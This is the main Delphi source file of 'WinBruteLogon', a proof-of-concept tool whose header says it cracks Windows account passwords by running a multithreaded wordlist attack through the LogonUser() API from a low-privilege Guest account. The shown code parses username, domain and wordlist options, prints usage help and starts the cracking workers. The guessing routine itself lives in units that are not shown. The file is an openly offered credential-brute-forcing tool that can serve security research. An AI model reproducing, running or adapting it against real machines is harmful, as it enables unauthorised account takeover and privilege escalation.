(*******************************************************************************

  Jean-Pierre LESUEUR (@DarkCoderSc)
  https://www.phrozen.io/
  jplesueur@phrozen.io

  License : MIT

  Release Date : 14/05/2020
    Highest version of Microsoft Windows Tested : Version 10.0.18363.836
    Tested on a slow environment (4 cores, Intel Core i3 (NUC) ~10000 pwd/sec)
    It works from GUEST account with lowest privilege.

  Description:
    Crack Windows Logon (MultiThreaded) PoC via "LogonUser()" WinAPI.
    No special privilege required.

    Might be patched in a near future, always enjoy present moment!

*******************************************************************************)

program WinBruteLogon;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  UntWorker in 'Units\UntWorker.pas',
  UntFunctions in 'Units\UntFunctions.pas',
  UntStringDefs in 'Units\UntStringDefs.pas',
  UntGlobalDefs in 'Units\UntGlobalDefs.pas';

{-------------------------------------------------------------------------------
  Help Banner
-------------------------------------------------------------------------------}
function DisplayHelpBanner(AFull : Boolean = False) : String;

  procedure AddLine(ALine : String = '');
  begin
    result := result + ALine + #13#10;
  end;

begin
  result := '';

  if AFull then begin
    AddLine('---------------------------------');
    AddLine('WinBruteLogon PoC)');
    AddLine('Jean-Pierre LESUEUR (@DarkCoderSc)');
    AddLine('https://github.com/darkcodersc');
    AddLine('https://www.phrozen.io/');
    AddLine('---------------------------------');
  end;

  AddLine();
  AddLine('Usage: winbrutelogon.exe -u <username> -w <wordlist_file>');
  AddLine('       winbrutelogon.exe -h : Show help.');

  if AFull then begin
    AddLine();

    AddLine('-h : Display this menu.');
    AddLine('-u : Username to crack.');
    AddLine('-d : Optional domain name.');
    AddLine('-w : Wordlist file.');
    AddLine('-v : Verbose mode.');

    AddLine();
  end;

  WriteLn(result);
end;

{-------------------------------------------------------------------------------
  Program Entry
-------------------------------------------------------------------------------}
var AWorkers    : TWorkers;
    AUserName   : String = '';
    ADomainName : String = '';
    AWordlist   : String = '';
begin
  IsMultiThread := True;
  ///
  try
    {
      Parse Parameters
    }
    if CommandLineOptionExists('h') then begin
      DisplayHelpBanner(True);

      Exit();
    end;

    if NOT GetCommandLineOption('u', AUserName) then
      raise Exception.Create('');

    if NOT GetCommandLineOption('w', AWordlist) then
      raise Exception.Create('');

    GetCommandLineOption('d', ADomainName);

    G_DEBUG := CommandLineOptionExists('v');

    if NOT FileExists(AWordlist) then
      raise Exception.Create(Format(SD_FILE_NOT_FOUND, [AWordlist]));
    ///

    {
      Start Workers
    }
    AWorkers := TWorkers.Create(AWordList, AUserName, ADomainName);

    AWorkers.Start();
  except
    on E: Exception do begin
      DisplayHelpBanner(False);
    end;
  end;
end.
